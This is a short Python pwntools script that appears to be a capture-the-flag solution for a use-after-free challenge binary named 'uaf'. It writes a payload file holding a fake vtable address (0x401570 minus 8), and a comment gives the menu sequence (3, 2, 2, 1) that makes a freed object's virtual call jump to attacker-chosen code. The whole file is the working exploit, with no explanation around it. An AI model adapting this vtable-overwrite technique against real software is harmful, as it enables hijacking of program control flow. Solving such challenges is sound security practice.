#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

vtable = 0x401570

'''
./uaf 24 payload
3
2
2
1
'''

with open("payload", "w") as f:
    f.write(p64(vtable-8))
